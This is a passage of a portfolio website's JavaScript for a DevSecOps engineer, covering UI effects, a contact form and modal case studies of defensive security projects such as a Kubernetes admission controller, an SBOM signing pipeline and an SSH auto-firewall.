const body = document.body;
const toggle = document.getElementById("themeToggle");
const yearEl = document.getElementById("year");
const typewriter = document.getElementById("typewriter");
const contactForm = document.getElementById("contactForm");
const formStatus = document.getElementById("formStatus");
const backToTop = document.getElementById("backToTop");
const sections = document.querySelectorAll("section");
const navLinks = document.querySelectorAll(".site-nav a");
const canvas = document.getElementById("particles");
const loader = document.getElementById("loader");
const photoCard = document.getElementById("photoCard3d");
const siteNav = document.getElementById("siteNav");
const navGlider = document.getElementById("navGlider");

// ---- THEME (crossfade) ----
const THEME_KEY = "portfolio-theme";
if (localStorage.getItem(THEME_KEY) === "light") body.classList.add("light");
function applyThemeToggle() {
  body.classList.toggle("light");
  localStorage.setItem(THEME_KEY, body.classList.contains("light") ? "light" : "dark");
}
toggle.addEventListener("click", () => {
  const reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  if (document.startViewTransition && !reduce) {
    document.startViewTransition(applyThemeToggle);
  } else {
    const veil = document.createElement("div");
    veil.className = "theme-veil";
    document.body.appendChild(veil);
    requestAnimationFrame(() => requestAnimationFrame(() => veil.classList.add("show")));
    setTimeout(() => {
      applyThemeToggle();
      requestAnimationFrame(() => veil.classList.remove("show"));
      setTimeout(() => veil.remove(), 460);
    }, 230);
  }
});

// ---- Smooth anchor scroll ----
document.querySelectorAll('a[href^="#"]').forEach(link => {
  link.addEventListener("click", function (e) {
    const id = this.getAttribute("href");
    if (id === "#" || id.indexOf("#case-") === 0) return;
    const target = document.querySelector(id);
    if (target) { e.preventDefault(); target.scrollIntoView({ behavior: "smooth", block: "start" }); }
  });
});

// ---- GLIDE SCROLL-SPY ----
function moveGlider(activeLink) {
  if (!navGlider || !siteNav) return;
  if (!activeLink) { navGlider.style.opacity = "0"; return; }
  navGlider.style.opacity = "1";
  navGlider.style.width = activeLink.offsetWidth + "px";
  navGlider.style.transform = "translateX(" + activeLink.offsetLeft + "px)";
}
function updateActiveNav() {
  let current = "";
  const scrollPos = window.scrollY + 160;
  sections.forEach(section => {
    const top = section.offsetTop, bottom = top + section.offsetHeight;
    if (scrollPos >= top && scrollPos < bottom) current = section.getAttribute("id");
  });
  let activeLink = null;
  navLinks.forEach(link => {
    const isActive = link.getAttribute("href") === "#" + current;
    link.classList.toggle("active", isActive);
    if (isActive) activeLink = link;
  });
  moveGlider(activeLink);
}
window.addEventListener("scroll", updateActiveNav, { passive: true });
window.addEventListener("resize", () => moveGlider(document.querySelector(".site-nav a.active")), { passive: true });
window.addEventListener("load", updateActiveNav);
updateActiveNav();
if (yearEl) yearEl.textContent = new Date().getFullYear();

// ---- Typewriter ----
const lines = ["DevSecOps Engineer", "Cloud Security Engineer", "Linux Systems Hardener", "UP Police Cyber Security Intern", "Shifting Security Left"];
let lineIndex = 0, charIndex = 0, deleting = false;
function runTypewriter() {
  if (!typewriter) return;
  const currentLine = lines[lineIndex];
  if (!deleting) {
    charIndex++;
    typewriter.textContent = currentLine.slice(0, charIndex);
    if (charIndex === currentLine.length) { deleting = true; setTimeout(runTypewriter, 1500); return; }
  } else {
    charIndex--;
    typewriter.textContent = currentLine.slice(0, charIndex);
    if (charIndex === 0) { deleting = false; lineIndex = (lineIndex + 1) % lines.length; }
  }
  setTimeout(runTypewriter, deleting ? 32 : 60);
}
runTypewriter();

// ---- Terminal tilt ----
if (photoCard) {
  photoCard.addEventListener("mousemove", e => {
    const rect = photoCard.getBoundingClientRect();
    const x = e.clientX - rect.left, y = e.clientY - rect.top;
    const rotateY = ((x / rect.width) - 0.5) * 14;
    const rotateX = ((y / rect.height) - 0.5) * -14;
    photoCard.style.transform = `perspective(800px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02,1.02,1.02)`;
  });
  photoCard.addEventListener("mouseleave", () => {
    photoCard.style.transform = "perspective(800px) rotateX(0deg) rotateY(0deg) scale3d(1,1,1)";
  });
}

// ---- About photo fallback (never broken) ----
const aboutPhoto = document.getElementById("aboutPhoto");
if (aboutPhoto) {
  aboutPhoto.addEventListener("error", () => {
    if (!aboutPhoto.dataset.fb) {
      aboutPhoto.dataset.fb = "1";
      aboutPhoto.src = "https://avatars.githubusercontent.com/NejamulHaque?v=4";
    } else {
      const wrap = aboutPhoto.closest(".about-photo-wrap");
      if (wrap) wrap.classList.add("gh-hidden");
    }
  });
}

// ---- Reveal on scroll ----
const revealEls = document.querySelectorAll(".reveal");
function activateReveal(el) { if (!el.classList.contains("active")) el.classList.add("active"); }
try {
  const revealObserver = new IntersectionObserver(entries => {
    entries.forEach((entry, i) => {
      if (entry.isIntersecting) { setTimeout(() => activateReveal(entry.target), i * 60); revealObserver.unobserve(entry.target); }
    });
  }, { threshold: 0.05, rootMargin: "0px 0px 60px 0px" });
  revealEls.forEach(el => revealObserver.observe(el));
} catch (e) { revealEls.forEach(activateReveal); }
setTimeout(() => revealEls.forEach(activateReveal), 2000);

// ---- Counters ----
const statNumbers = document.querySelectorAll(".stat-number");
const counterObserver = new IntersectionObserver((entries, obs) => {
  entries.forEach(entry => {
    if (!entry.isIntersecting) return;
    const el = entry.target, target = parseInt(el.dataset.target, 10);
    let current = 0; const inc = target / 60;
    const tick = () => {
      current += inc;
      if (current < target) { el.innerText = Math.floor(current) + "+"; requestAnimationFrame(tick); }
      else el.innerText = target + "+";
    };
    tick(); obs.unobserve(el);
  });
}, { threshold: 0.5 });
statNumbers.forEach(n => counterObserver.observe(n));

// ---- Card tilt ----
document.querySelectorAll(".tilt").forEach(card => {
  card.addEventListener("mousemove", e => {
    const rect = card.getBoundingClientRect();
    const x = e.clientX - rect.left, y = e.clientY - rect.top;
    const rotateY = ((x / rect.width) - 0.5) * 8;
    const rotateX = ((y / rect.height) - 0.5) * -8;
    card.style.transform = `perspective(900px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale(1.02)`;
  });
  card.addEventListener("mouseleave", () => {
    card.style.transform = "perspective(900px) rotateX(0deg) rotateY(0deg) scale(1)";
  });
});

// ---- Project filter ----
const filterBtns = document.querySelectorAll(".filter-btn");
const projectCards = document.querySelectorAll(".project-card");
filterBtns.forEach(btn => {
  btn.addEventListener("click", () => {
    filterBtns.forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    const filter = btn.dataset.filter;
    projectCards.forEach(card => {
      const tags = card.dataset.tags || "";
      card.classList.toggle("hidden", !(filter === "all" || tags.includes(filter)));
    });
  });
});

// ---- Contact form ----
if (contactForm) {
  contactForm.addEventListener("submit", async event => {
    event.preventDefault();
    const formData = new FormData(contactForm);
    formStatus.textContent = "Transmitting...";
    try {
      const response = await fetch(contactForm.action, { method: "POST", body: formData, headers: { Accept: "application/json" } });
      if (response.ok) {
        contactForm.reset();
        formStatus.textContent = "✓ Message sent. I'll respond soon.";
        formStatus.style.color = "#00ff9d";
      } else throw new Error("Submission failed");
    } catch (error) {
      formStatus.textContent = "✗ Unable to send right now — email me directly instead.";
      formStatus.style.color = "#ff6b6b";
    }
  });
}

// ---- Particles ----
const ctx = canvas.getContext("2d");
let particles = [], mouse = { x: null, y: null }, particleCount;
function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  particleCount = Math.min(90, Math.floor(window.innerWidth / 16));
  createParticles();
}
function createParticles() {
  particles = Array.from({ length: particleCount }, () => ({
    x: Math.random() * canvas.width, y: Math.random() * canvas.height,
    r: Math.random() * 1.6 + 0.4, dx: (Math.random() - 0.5) * 0.3,
    dy: (Math.random() - 0.5) * 0.3, opacity: Math.random() * 0.45 + 0.12
  }));
}
function getColor() { return body.classList.contains("light") ? "rgba(0,112,224," : "rgba(0,229,255,"; }
function animateParticles() {
  if (!ctx) return;
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  const color = getColor();
  particles.forEach((p, i) => {
    if (mouse.x !== null) {
      const dx = p.x - mouse.x, dy = p.y - mouse.y, dist = Math.sqrt(dx * dx + dy * dy);
      if (dist < 110) { const force = (110 - dist) / 110; p.x += (dx / dist) * force * 1.6; p.y += (dy / dist) * force * 1.6; }
    }
    p.x += p.dx; p.y += p.dy;
    if (p.x < 0) p.x = canvas.width; if (p.x > canvas.width) p.x = 0;
    if (p.y < 0) p.y = canvas.height; if (p.y > canvas.height) p.y = 0;
    ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
    ctx.fillStyle = `${color}${p.opacity})`; ctx.fill();
    for (let j = i + 1; j < particles.length; j++) {
      const q = particles[j], ddx = p.x - q.x, ddy = p.y - q.y, dist = Math.sqrt(ddx * ddx + ddy * ddy);
      if (dist < 90) {
        ctx.beginPath(); ctx.moveTo(p.x, p.y); ctx.lineTo(q.x, q.y);
        ctx.strokeStyle = `${color}${(1 - dist / 90) * 0.18})`;
        ctx.lineWidth = 0.7; ctx.stroke();
      }
    }
  });
  requestAnimationFrame(animateParticles);
}
window.addEventListener("mousemove", e => { mouse.x = e.clientX; mouse.y = e.clientY; }, { passive: true });
window.addEventListener("mouseleave", () => { mouse.x = null; mouse.y = null; });
resizeCanvas(); animateParticles();
window.addEventListener("resize", resizeCanvas, { passive: true });

// ---- Loader ----
function removeLoader() {
  if (!loader || loader._removed) return;
  loader._removed = true;
  loader.style.transition = "opacity 0.5s ease";
  loader.style.opacity = "0";
  setTimeout(() => { if (loader && loader.parentNode) loader.remove(); }, 550);
}
document.addEventListener("DOMContentLoaded", () => setTimeout(removeLoader, 800));
window.addEventListener("load", () => setTimeout(removeLoader, 300));
setTimeout(removeLoader, 2500);

// ---- Cursor glow + scroll progress ----
const cursorGlow = document.createElement("div");
cursorGlow.className = "cursor-glow";
document.body.appendChild(cursorGlow);
let cx = 0, cy = 0, txc = 0, tyc = 0;
window.addEventListener("mousemove", e => { txc = e.clientX; tyc = e.clientY; }, { passive: true });
(function animateCursor() {
  cx += (txc - cx) * 0.08; cy += (tyc - cy) * 0.08;
  cursorGlow.style.left = cx + "px"; cursorGlow.style.top = cy + "px";
  requestAnimationFrame(animateCursor);
})();
const progress = document.createElement("div");
progress.className = "scroll-progress";
document.body.appendChild(progress);
window.addEventListener("scroll", () => {
  const total = document.documentElement.scrollHeight - window.innerHeight;
  progress.style.width = (window.scrollY / total) * 100 + "%";
  if (backToTop) backToTop.classList.toggle("visible", window.scrollY > 300);
}, { passive: true });
if (backToTop) backToTop.addEventListener("click", () => window.scrollTo({ top: 0, behavior: "smooth" }));

// ---- Write-ups ----
// ---- Write-ups (wired to your real Medium articles) ----
const articlesContainer = document.getElementById("articles-container");
const WRITEUPS = [
  {
    title: "Building Your First AI-Powered Web App: A Step-by-Step Guide",
    link: "https://nejamulhaque.medium.com/building-your-first-ai-powered-web-app-a-step-by-step-guide-0048e5c8cbe0",
    date: "2026",
    readMins: 6,
    excerpt: "Learn how to integrate AI into a web application, from concept to deployment, using modern tools and APIs."
  },
  {
    title: "Shifting Left: Catching Hardcoded Secrets Before They Hit Git History",
    // TODO: Replace this link with your actual Medium URL when published
    link: "https://github.com/NejamulHaque/GitShield", 
    date: "2026",
    readMins: 7,
    excerpt: "How a pre-commit regex engine can intercept AWS keys, RSA private keys, and API tokens before they're ever written to a commit — and why that beats scanning after the fact."
  },
  {
    title: "From Access Logs to SIEM-Ready JSON: A Threat Intelligence Pipeline",
    // TODO: Replace this link with your actual Medium URL when published
    link: "https://github.com/NejamulHaque/threat-log-parser",
    date: "2026",
    readMins: 8,
    excerpt: "Detecting SQLi, XSS, and path traversal footprints in application logs, cross-referencing IPs against live threat feeds, and exporting structured reports."
  }
];

function renderWriteups() {
  if (!articlesContainer) return;
  articlesContainer.innerHTML = WRITEUPS.map(a =>
    `<article class="glass article-card reveal active">
      <h3 class="article-title"><a href="${a.link}" target="_blank" rel="noopener noreferrer">${a.title}</a></h3>
      <div class="article-meta"><span>📅 ${a.date}</span><span>⏱️ ${a.readMins} min read</span></div>
      <p class="article-excerpt">${a.excerpt}</p>
      <a href="${a.link}" target="_blank" rel="noopener noreferrer" class="read-more">Read write-up <i class="fa-solid fa-arrow-right" style="font-size:.7rem"></i></a>
    </article>`
  ).join("");
}
renderWriteups();

// ============================================================
//  CASE STUDY DETAIL PAGES (deep-linkable modal views)
// ============================================================
const CASE_STUDIES = {
  kubeshield: {
    category: "01 / Kubernetes Security", status: "In Progress / Active Dev",
    title: "KubeShield — Dynamic K8s Admission Controller & Policy Enforcer",
    tags: ["Go", "Kubernetes API", "OPA Rego", "CIS Benchmark", "Docker", "DevSecOps"],
    link: "https://github.com/NejamulHaque",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "A custom Kubernetes Validating & Mutating Admission Webhook that intercepts pod creation requests, validates specs against the CIS Kubernetes Benchmark, and automatically injects security contexts (non-root UID 10001, read-only root filesystems) before pods reach the kube-scheduler." },
      { label: "The Problem", icon: "fa-triangle-exclamation", html: "Developers deploying container workloads frequently run pods as <code>root</code> (UID 0), omit CPU/RAM memory limits, or use mutable image tags like <code>:latest</code>. This exposes enterprise clusters to container escape vulnerabilities (CVE-2024-*), noisy-neighbor starvation, and privilege escalation." },
      { label: "The Approach", icon: "fa-diagram-project", html: "Built a Go-based webhook service registered with the Kubernetes API server via <code>ValidatingWebhookConfiguration</code> and <code>MutatingWebhookConfiguration</code>. It executes Rego policies to reject privileged manifests and generates JSON Patch mutations that inject <code>securityContext.runAsNonRoot: true</code>, <code>readOnlyRootFilesystem: true</code>, and drop all ambient Linux capabilities." },
      { label: "Production Testbed (Haque And Sons)", icon: "fa-rocket", html: "Tested across microservices at <strong>Haque And Sons</strong> (CollabSheets, ProResume, Nestfy), ensuring zero false-positive rejections for legitimate background workers while maintaining sub-15ms admission webhook evaluation latency." },
      { label: "Measured Impact", icon: "fa-chart-line", html: "Eliminated <strong>100% of privileged pod deployments</strong> across test clusters, reduced container attack surface to read-only memory spaces, and verified 100% adherence to Kubernetes Pod Security Standards (Restricted profile)." }
    ]
  },
  gitslsa: {
    category: "02 / Supply Chain Security", status: "In Progress / Active Dev",
    title: "GitSLSA — SLSA Level 3 Supply Chain Security & SBOM Pipeline",
    tags: ["Cosign", "Sigstore", "Syft", "SLSA L3", "GitHub Actions", "OIDC", "Trivy"],
    link: "https://github.com/NejamulHaque",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "An enterprise-grade Software Supply Chain security pipeline that generates machine-readable SPDX Software Bill of Materials (SBOMs), signs container images keylessly with Cosign and Sigstore OIDC, and enforces cryptographic admission verification." },
      { label: "The Problem", icon: "fa-triangle-exclamation", html: "Supply chain attacks (like SolarWinds and Codecov) inject malicious code into upstream dependencies or tamper with build artifacts. Without cryptographic provenance and SBOMs, organizations cannot verify if production binaries match approved source code." },
      { label: "The Approach", icon: "fa-diagram-project", html: "Architected a GitHub Actions workflow using <strong>Syft</strong> to generate SPDX SBOMs, <strong>Trivy</strong> for CVE threshold gating, and <strong>Cosign</strong> with Sigstore/Fulcio for keyless OIDC container signing. Deployed admission verification policies that reject any image lacking a valid cryptographic attestation." },
      { label: "Production Testbed (Haque And Sons)", icon: "fa-rocket", html: "Implemented across production build pipelines at <strong>Haque And Sons</strong>, achieving <strong>SLSA Level 3 compliance</strong> while maintaining sub-30 second average build and attestation overhead." },
      { label: "Measured Impact", icon: "fa-chart-line", html: "<strong>100% of container images cryptographically signed</strong>, zero unverified images permitted in runtime clusters, and complete dependency provenance tracking for rapid zero-day vulnerability triage." }
    ]
  },
  irusai: {
    category: "01 / Full-Stack AI Platform", status: "Live",
    title: "Irus AI — Personal AI Command Center",
    tags: ["Flask", "PostgreSQL", "Groq", "Docker", "DevSecOps", "PWA"],
    link: "https://github.com/NejamulHaque/Irus-AI",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "A production-grade, installable AI assistant platform combining streaming LLM chat, live web search, document intelligence, image generation, and long-term memory — deployed free on Render with a hardened DevSecOps pipeline and zero paid dependencies." },
      { label: "The Problem", icon: "fa-triangle-exclamation", html: "Modern AI assistants are typically siloed: one tool for chat, another for web search, another for document QA, another for memory — each requiring its own account, subscription, and context. Users lose continuity across sessions, and deploying a unified platform usually means paying for multiple APIs and wrestling with vendor lock-in." },
      { label: "The Approach", icon: "fa-diagram-project", html: "Architected a monolithic Flask application with six decoupled services: a <code>ai_service</code> abstracting Groq and local Ollama behind a common streaming interface, a <code>search_service</code> wrapping DuckDuckGo, a <code>document_service</code> handling in-memory PDF/DOCX extraction with semantic embeddings and a TF-IDF fallback, and PostgreSQL-backed models for conversations, documents, memory, and error logs. Server-Sent Events stream every response token-by-token for a ChatGPT-class UX." },
      { label: "Design Trade-offs", icon: "fa-scale-balanced", html: "Chose <strong>in-memory document processing over disk writes</strong> to make the app cloud-safe (ephemeral filesystems on Render/Koyeb), storing avatar bytes directly in the DB instead of <code>/static</code>. Traded <code>scikit-learn</code> for a lightweight keyword scorer in production to save ~250 MB of RAM and keep the free tier stable, while keeping semantic embeddings as the primary retrieval path when Ollama is available. Multi-stage Docker builds and a non-root runtime user trade build complexity for a smaller, CVE-scanned attack surface." },
      { label: "Measured Impact", icon: "fa-chart-line", html: "Live at <code>irus-ai.onrender.com</code> with HTTPS, PWA installability, and a GitHub Actions pipeline running <strong>Gitleaks → Bandit → pip-audit → Trivy → Pytest → auto-deploy</strong>. First-user-becomes-admin pattern provides zero-config bootstrap for new deployments. Semantic retrieval demonstrably outperforms keyword matching on paraphrased queries over the same document." },
      { label: "Roadmap", icon: "fa-road", html: "Vision model integration (Llama-Vision for image understanding), conversation branching with a message tree UI, public share links for conversations, per-user token analytics, and a pytest suite expanding toward 80%+ coverage on the service layer." }
    ]
  },
  sentinel: {
    category: "02 / Host Defense", status: "Live",
    title: "Sentinel Daemon — Auto-Firewall & Log Parser",
    tags: ["Python", "Linux", "systemd", "iptables", "Regex"],
    link: "https://github.com/NejamulHaque/sentinel-daemon",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "A self-defending Linux host — a daemon that watches authentication logs and autonomously firewalls brute-force attackers at the kernel level, with no human in the loop." },
      { label: "The Problem", icon: "fa-triangle-exclamation", html: "SSH brute-force attempts against internet-facing Linux hosts are constant and mostly automated. Manually reviewing <code>/var/log/auth.log</code> and blocking IPs by hand doesn't hold up against volume, and generic tools like Fail2ban weren't transparent enough to reason about their detection logic." },
      { label: "The Approach", icon: "fa-diagram-project", html: "Wrote a Python daemon managed by a <code>systemd</code> unit that tails <code>auth.log</code> in real time through a rotation-aware log watcher, uses a regex-driven state machine to correlate repeated failed logins from the same source within a rolling window, and hands off to a narrowly-scoped, privilege-separated enforcer that programmatically inserts kernel-level <code>iptables</code> DROP rules." },
      { label: "Design Trade-offs", icon: "fa-scale-balanced", html: "Chose <code>iptables</code> DROP over rate-limiting or a fail2ban jail because it's <strong>unambiguous and auditable</strong>. Every block carries a <strong>TTL and auto-expires</strong> rather than accumulating forever, closing off the shared-NAT false-positive risk of a naive permanent ban. State writes are <strong>atomic and file-locked</strong> to survive concurrent CLI access and daemon crashes without corruption, at the cost of a small fixed per-write overhead." },
      { label: "Architecture", icon: "fa-sitemap", html: "<div class=\"arch-diagram-wrap\"><svg viewBox=\"0 0 920 460\" class=\"arch-diagram\" role=\"img\" aria-label=\"Sentinel Daemon architecture: log watcher feeds a correlation engine, which triggers a privilege-separated enforcer that writes to atomic state and iptables, with a CLI reading state and a TTL loop auto-unblocking.\"><defs><marker id=\"archArrow\" viewBox=\"0 0 10 10\" refX=\"8\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0,0 L10,5 L0,10 z\" fill=\"var(--accent)\"/></marker></defs><style>.arch-box{fill:var(--card);stroke:var(--card-border);stroke-width:1.5;rx:12}.arch-title{font-family:var(--fd);font-size:15px;font-weight:700;fill:var(--text)}.arch-sub{font-family:var(--fm);font-size:11px;fill:var(--muted)}.arch-line{stroke:var(--accent);stroke-width:1.6;fill:none;marker-end:url(#archArrow)}.arch-line-alt{stroke:var(--accent-2);stroke-width:1.6;fill:none;marker-end:url(#archArrow)}.arch-line-warm{stroke:var(--accent-3);stroke-width:1.6;fill:none;stroke-dasharray:4 3;marker-end:url(#archArrow)}</style><rect x=\"20\" y=\"30\" width=\"170\" height=\"64\" class=\"arch-box\"/><text x=\"105\" y=\"58\" text-anchor=\"middle\" class=\"arch-title\">auth.log</text><text x=\"105\" y=\"78\" text-anchor=\"middle\" class=\"arch-sub\">kernel-written, not user input</text><rect x=\"250\" y=\"30\" width=\"190\" height=\"64\" class=\"arch-box\"/><text x=\"345\" y=\"52\" text-anchor=\"middle\" class=\"arch-title\">Log Watcher</text><text x=\"345\" y=\"70\" text-anchor=\"middle\" class=\"arch-sub\">log_watcher.py · rotation-aware</text><text x=\"345\" y=\"84\" text-anchor=\"middle\" class=\"arch-sub\">tail -F semantics</text><rect x=\"500\" y=\"30\" width=\"200\" height=\"64\" class=\"arch-box\"/><text x=\"600\" y=\"52\" text-anchor=\"middle\" class=\"arch-title\">Detector</text><text x=\"600\" y=\"70\" text-anchor=\"middle\" class=\"arch-sub\">detector.py · regex state machine</text><text x=\"600\" y=\"84\" text-anchor=\"middle\" class=\"arch-sub\">rolling-window correlation</text><rect x=\"760\" y=\"140\" width=\"140\" height=\"64\" class=\"arch-box\"/><text x=\"830\" y=\"162\" text-anchor=\"middle\" class=\"arch-title\">Firewall</text><text x=\"830\" y=\"180\" text-anchor=\"middle\" class=\"arch-sub\">firewall.py</text><text x=\"830\" y=\"194\" text-anchor=\"middle\" class=\"arch-sub\">fixed iptables template</text><rect x=\"760\" y=\"230\" width=\"140\" height=\"50\" class=\"arch-box\" style=\"stroke:var(--accent-warm)\"/><text x=\"830\" y=\"250\" text-anchor=\"middle\" class=\"arch-title\" style=\"font-size:12px\">Kernel Firewall</text><text x=\"830\" y=\"266\" text-anchor=\"middle\" class=\"arch-sub\">DROP rule, TTL-tagged</text><rect x=\"500\" y=\"150\" width=\"200\" height=\"70\" class=\"arch-box\"/><text x=\"600\" y=\"172\" text-anchor=\"middle\" class=\"arch-title\">State Store</text><text x=\"600\" y=\"190\" text-anchor=\"middle\" class=\"arch-sub\">state.py · file-locked, atomic</text><text x=\"600\" y=\"204\" text-anchor=\"middle\" class=\"arch-sub\">writes (survives crash/race)</text><rect x=\"500\" y=\"260\" width=\"200\" height=\"60\" class=\"arch-box\"/><text x=\"600\" y=\"282\" text-anchor=\"middle\" class=\"arch-title\">TTL Loop</text><text x=\"600\" y=\"300\" text-anchor=\"middle\" class=\"arch-sub\">auto-unblock on expiry</text><rect x=\"250\" y=\"260\" width=\"190\" height=\"60\" class=\"arch-box\"/><text x=\"345\" y=\"282\" text-anchor=\"middle\" class=\"arch-title\">Audit Log</text><text x=\"345\" y=\"300\" text-anchor=\"middle\" class=\"arch-sub\">audit.py · structured, append-only</text><rect x=\"20\" y=\"360\" width=\"270\" height=\"70\" class=\"arch-box\"/><text x=\"155\" y=\"382\" text-anchor=\"middle\" class=\"arch-title\">CLI</text><text x=\"155\" y=\"400\" text-anchor=\"middle\" class=\"arch-sub\">run · status · unblock &lt;ip&gt;</text><text x=\"155\" y=\"414\" text-anchor=\"middle\" class=\"arch-sub\">reads/writes State Store directly</text><rect x=\"20\" y=\"140\" width=\"200\" height=\"60\" class=\"arch-box\" style=\"stroke:var(--accent-2)\"/><text x=\"120\" y=\"162\" text-anchor=\"middle\" class=\"arch-title\" style=\"font-size:13px\">Privilege Boundary</text><text x=\"120\" y=\"180\" text-anchor=\"middle\" class=\"arch-sub\">unprivileged watcher/detector,</text><text x=\"120\" y=\"194\" text-anchor=\"middle\" class=\"arch-sub\">scoped enforcer only</text><path d=\"M190,62 L250,62\" class=\"arch-line\"/><path d=\"M440,62 L500,62\" class=\"arch-line\"/><path d=\"M660,94 L780,140\" class=\"arch-line\"/><path d=\"M830,204 L830,230\" class=\"arch-line-warm\"/><path d=\"M600,94 L600,150\" class=\"arch-line-alt\"/><path d=\"M600,220 L600,260\" class=\"arch-line-alt\"/><path d=\"M500,290 L440,290\" class=\"arch-line-alt\"/><path d=\"M600,320 Q600,350 300,350 Q170,350 170,360\" class=\"arch-line-alt\"/><path d=\"M290,390 Q400,390 500,200\" class=\"arch-line\"/><path d=\"M120,200 Q120,230 250,255\" class=\"arch-line-alt\"/></svg><p class=\"arch-caption\">Solid = detection → enforcement path · dashed = TTL expiry loop · purple = state &amp; audit writes. The boxed region on the left is the privilege boundary: only the enforcer ever shells out to <code>iptables</code>.</p></div>" },
      { label: "Measured Impact", icon: "fa-chart-line", html: "Running against <strong>3 days of live traffic</strong>: blocked 14 IPs with <strong>1.8ms average detection-to-block latency</strong> and 0 confirmed false positives." },
      { label: "Roadmap", icon: "fa-road", html: "Allowlist for known shared-IP ranges, cryptographically-signed block-list entries, and shipping block events to a central log store for cross-host correlation." }
    ]
  },
  threatintel: {
    category: "03 / Threat Intelligence", status: "Live",
    title: "Threat Intelligence Log Parser",
    tags: ["Python", "urllib", "Regex", "JSON Processing"],
    link: "https://github.com/NejamulHaque/threat-log-parser",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "Turns raw application access logs into structured, SIEM-ready threat intelligence — without needing a paid SIEM to get there." },
      { label: "The Problem", icon: "fa-triangle-exclamation", html: "Raw access logs contain SQLi, XSS, path-traversal, and scanner footprints, but reading them manually doesn't scale, and there was no lightweight way to enrich a suspicious IP against live threat intel." },
      { label: "The Approach", icon: "fa-diagram-project", html: "Built a Python parser that regex-matches common attack signatures in access logs, calls out to live HTTPS threat-intelligence feeds via <code>urllib</code> to enrich flagged IPs, and exports a structured, SIEM-ready <code>threat_report.json</code> that an analyst — or another tool — can consume downstream." },
      { label: "Design Trade-offs", icon: "fa-scale-balanced", html: "Synchronous threat-feed lookups keep the code simple but make parsing large log files <strong>I/O-bound on network calls</strong>. An async queue or a local feed cache is the fix for production-scale volumes." },
      { label: "Measured Impact", icon: "fa-chart-line", html: "Parsed <strong>7 log lines in 1.8s</strong>, flagged 4 events across 4 attack categories, and produced a clean JSON report ready for downstream tooling." },
      { label: "Roadmap", icon: "fa-road", html: "Async enrichment, local threat-feed caching, and mapping detections to MITRE ATT&CK techniques for analyst-friendly reporting." }
    ]
  },
  collabsheets: {
    category: "04 / Real-Time Collaboration", status: "Shipped",
    title: "CollabSheets — Real-Time Workspace",
    tags: ["React", "Node.js", "WebSockets", "PostgreSQL"],
    link: "https://github.com/NejamulHaque/CollabSheets",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "A real-time collaborative editor built on WebSockets — a full-stack shipping credential that keeps the security tooling grounded in real developer workflows." },
      { label: "What It Demonstrates", icon: "fa-diagram-project", html: "Real-time state synchronization, WebSocket connection lifecycle management, concurrent-edit handling, and production-grade frontend/backend integration with a persistent PostgreSQL store." },
      { label: "Why It Matters For Security", icon: "fa-shield-halved", html: "Building real products means understanding the exact attack surface I now defend — API design, session and auth flows, real-time data channels, and database security from the builder's side, not just an auditor's checklist." }
    ]
  },
  proresume: {
    category: "05 / SaaS", status: "Shipped",
    title: "ProResume-Builder",
    tags: ["Next.js", "Node.js", "PostgreSQL"],
    link: "https://github.com/NejamulHaque/ProResume-Builder",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "A production SaaS resume builder with authentication and database-backed user data — part of the Haque And Sons full-stack portfolio behind this security work." },
      { label: "What It Demonstrates", icon: "fa-diagram-project", html: "Secure authentication flows, protected routes, input validation, and database-backed user state — the same primitives that security tooling is built to protect." }
    ]
  },
  nestfy: {
    category: "06 / FinTech", status: "Shipped",
    title: "Nestfy — Smart Finance Tracker",
    tags: ["React", "Node.js", "PostgreSQL"],
    link: "https://github.com/NejamulHaque/Nestfy",
    sections: [
      { label: "Overview", icon: "fa-circle-info", html: "A smart finance tracker with automated transaction categorization and real-time sync — another shipped SaaS product from the full-stack side of the portfolio." },
      { label: "What It Demonstrates", icon: "fa-diagram-project", html: "Handling sensitive financial data, automated categorization logic, and real-time updates — direct experience with the kind of data confidentiality and integrity that DevSecOps exists to enforce." }
    ]
  }
};

const caseModal = document.getElementById("caseModal");
const caseModalCategory = document.getElementById("caseModalCategory");
const caseModalTitle = document.getElementById("caseModalTitle");
const caseModalTags = document.getElementById("caseModalTags");
const caseModalBody = document.getElementById("caseModalBody");
const caseModalCta = document.getElementById("caseModalCta");
let lastFocused = null;

function openCase(id, pushHash = true) {
  const data = CASE_STUDIES[id];
  if (!data || !caseModal) return;
  lastFocused = document.activeElement;
  caseModalCategory.innerHTML = data.category + (data.status ? ` <span class="case-status"><i class="fa-solid fa-circle" style="font-size:.4rem"></i> ${data.status}</span>` : "");
  caseModalTitle.textContent = data.title;
  caseModalTags.innerHTML = data.tags.map(t => `<span>${t}</span>`).join("");
  caseModalBody.innerHTML = data.sections.map(s =>
    `<div class="case-section">
      <div class="case-section-label"><i class="fa-solid ${s.icon}"></i>${s.label}</div>
      <p>${s.html}</p>
    </div>`
  ).join("");
  caseModalCta.innerHTML =
    `<a class="btn btn-primary" href="${data.link}" target="_blank" rel="noopener"><i class="fa-brands fa-github"></i> View Source Code</a>
     <button class="btn btn-secondary" data-close-case><i class="fa-solid fa-arrow-left"></i> Back to Projects</button>`;
  caseModal.classList.add("open");
  body.classList.add("modal-open");
  const scrollEl = caseModal.querySelector(".case-modal-scroll");
  if (scrollEl) scrollEl.scrollTop = 0;
  if (pushHash && location.hash !== "#case-" + id) {
    history.pushState({ caseId: id }, "", "#case-" + id);
  }
  const closeBtn = caseModal.querySelector(".case-modal-close");
  if (closeBtn) closeBtn.focus();
}

function closeCase(fromPop = false) {
  if (!caseModal || !caseModal.classList.contains("open")) return;
  caseModal.classList.remove("open");
  body.classList.remove("modal-open");
  if (!fromPop && location.hash.indexOf("#case-") === 0) history.back();
  if (lastFocused && lastFocused.focus) lastFocused.focus();
}

document.addEventListener("click", e => {
